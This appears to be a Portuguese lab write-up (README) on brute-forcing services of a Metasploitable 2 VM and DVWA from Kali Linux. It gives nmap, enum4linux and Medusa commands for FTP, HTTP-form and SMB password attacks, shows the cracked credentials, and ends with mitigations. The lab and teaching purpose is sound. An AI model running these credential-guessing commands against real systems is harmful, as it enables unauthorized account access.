# Simula-o-Brut# 🔐 Simulação de Ataques Brute Force com Kali Linux e Medusa

Projeto prático de cibersegurança com foco em ataques de força bruta e enumeração de serviços, utilizando ambiente controlado com máquinas virtuais.

---

## 🎯 Objetivo

Demonstrar na prática como ataques de força bruta funcionam em diferentes serviços, utilizando:

- Kali Linux (máquina atacante)
- Metasploitable 2 (máquina vulnerável)
- DVWA (aplicação web vulnerável)
- Medusa (ferramenta de brute force)

---

## 🖥️ Ambiente

| Componente        | Descrição |
|------------------|----------|
| Sistema atacante | Kali Linux |
| Sistema alvo     | Metasploitable 2 |
| Virtualização    | VirtualBox |
| Rede             | Host-only |

---

## 🌐 Configuração de Rede

- Kali Linux: 192.168.56.102  
- Metasploitable: 192.168.56.101  

---
🔎 Scan de portas
                         nmap -sV -p 21,22,80,445,139 192.168.56.101

                       🔑 Serviços identificados
FTP (21)
SSH (22)
HTTP (80)
SMB (139, 445)  


# 🔍 Enumeração

## SMB - enum4linux

Comando:

```bash enum4linux -a 192.168.56.101 | tee enum4_output.txte-Force-KALI-Medusa````
Descobertas
Host: METASPLOITABLE
Workgroup: WORKGROUP
Samba: 3.0.20-Debian
NULL session permitida
      
    👤 Usuários Descobertos
    

Exemplo:

root
msfadmin
postgres
mysql
www-data
 
⚠️ O servidor permite conexão sem autenticação, expondo informações sensíveis.

👤 Usuários identificados
root
msfadmin
postgres
mysql
www-data
ftp
📂 Compartilhamentos
tmp (acesso permitido)
print$
opt
ADMIN$
IPC$

⚠️ O compartilhamento tmp permite listagem sem autenticação.
🔐 Política de senha
Comprimento mínimo: 0
Complexidade: desativada
Lockout: não configurado

⚠️ Ambiente totalmente vulnerável a brute force.

⚔️ Ataques Realizados
🔓 FTP Brute Force:
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M ftp -t 6
                                                            ✅ Resultado:
                                                            ACCOUNT FOUND: msfadmin / msfadmin

🌐 HTTP (DVWA)
medusa -h 192.168.56.101 -U users.txt -P pass.txt -M http \
-m PAGE:/dvwa/login.php \
-m FORM:"username=^USER^&password=^PASS^&login=Login" \
-m FAIL:"Login failed"
                                                          ✅ Resultado: login válido identificado


🖥️ SMB Password Spraying
medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2
                                                          ✅ Resultado:
                                                          ACCOUNT FOUND: msfadmin / msfadmin

🧪 Validação
smbclient -L //192.168.56.101 -U msfadmin              ✅ Acesso confirmado aos compartilhamentos.

                                                          
      🧠 Análise Técnica

O sucesso dos ataques ocorreu devido a:

Permissão de NULL session
Enumeração de usuários sem autentação
Senhas fracas
Ausência de política de segurança
Serviços expostos     

🛡️ Mitigações
Implementar senhas fortes (mínimo 12 caracteres)
Ativar MFA
Bloquear tentativas de login
Monitorar logs
Desativar serviços desnecessários
Atualizar serviços (Samba, FTP)
📊 Contexto Real

Segundo a Verizon, mais de 80% das violações envolvem credenciais comprometidas.


💡 Reflexão

Segurança não é impedir ataques — é tornar o ataque inviável.

# 🛡️ Mitigações

- Senhas fortes
- MFA
- Monitoramento
- Bloqueio de tentativas
- Hardening de serviços

                                                    
